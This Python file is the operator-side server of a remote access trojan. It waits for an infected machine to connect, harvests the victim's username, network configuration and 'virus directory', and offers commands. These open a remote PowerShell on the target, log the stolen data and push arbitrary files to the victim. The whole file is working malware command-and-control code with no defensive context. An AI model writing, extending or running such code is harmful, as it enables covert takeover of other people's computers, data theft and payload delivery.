import os
import socket
import time

HOST = ""
PORT = 21214

BUFFER_SIZE = 1024

# OPEN THE CONNECTION
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((HOST, PORT))
print(f"SERVER IS LISTENING ON PORT {PORT}")
server.listen(1)

print("Waiting for a connection...")
user, addr = server.accept()
print(f"CONNECTED ! ADDR:{addr} ! WELL PIRATED !!!!!!!!")
data = user.recv(1024).decode()
print(f"Welcome data: \n\n{data}\n")
data = user.recv(1024 * 32).decode().split("|")
print(data)
userlogin, ipconfig, actualVdir = data

cd = "./"


def check_receive(user):
    rtn = user.recv(1024).decode()
    if rtn == "OK":
        return
    else:
        print(f"RETURNING SOMETHING ELSE: {user} ! 'OK' PACKET NOT RECEIVE !")
        return


is_server_on = True
while is_server_on:
    cmd = input(">>> ")
    if cmd == "quit":
        is_server_on = False
        user.send("disconnect".encode())
        check_receive(user)

    if cmd == "pwshl":
        while True:
            sd = input("?reset: reset path to ./\n?cd <paht>: addd path to cd (cd += path)\n\nWhat do you want to send ? >>> ")
            if "?reset" in sd:
                cd = "./"
                pass
            if "?cd " in sd:
                cd += sd.replace("?cd ", "")
                print(f"The directory is now: {cd}")
                pass
            if sd == "EXIT":
                break

            user.send("pwshl".encode())
            check_receive(user)
            time.sleep(0.2)
            sd = f"cd {cd};{sd}"
            user.send(sd.encode())
            check_receive(user)
            data = user.recv(1024 * 32).decode()
            print(f"USER: {data}")

    if cmd == "fish":
        with open(f"{userlogin}-{addr[0]}.log", "w") as file:
            separator = "\n-----------------------------------------------------------------------------------\n"
            file.write(f"Userlogin: {userlogin}\n"
                       f"{separator}IP Config:\n"
                       f"{ipconfig}\n"
                       f"{separator}Actual Virus Directory:\n"
                       f"{actualVdir}")

    if cmd == "push":

        filename = input("You request to push a file !\n"
                         "What is the name of the file located on ./pushable/ >>> ")
        path = f"./pushable/{filename}"
        if os.path.exists(path):
            print("File found starting pushing !")

            user.send("pushfile".encode())
            check_receive(user)
            user.send(str(BUFFER_SIZE).encode())
            check_receive(user)
            user.send(filename.encode())
            check_receive(user)
            file = open(path, "r")
            i = 0
            while True:
                l = file.read(BUFFER_SIZE)
                if l:
                    print(f"Sending block {i}")
                    user.send(l.encode())
                    check_receive(user)
                    print("OK")
                    i += 1
                if not l:
                    user.send("||END OF THE TRANSMISSION !||".encode())
                    check_receive(user)
                    break
            file.close()
            print("\nPush complete !")

        else:
            print("File not found !")

    if cmd == "help":
        print(f"Help:\n"
              f"quit: disconnect\n"
              f"pwshl: init a remote pwshl\n"
              "fish: download simple data (ip, username, path of the virus, ...) and save in ./{userid}.log\n"
              "push: push a file to the target !\n")
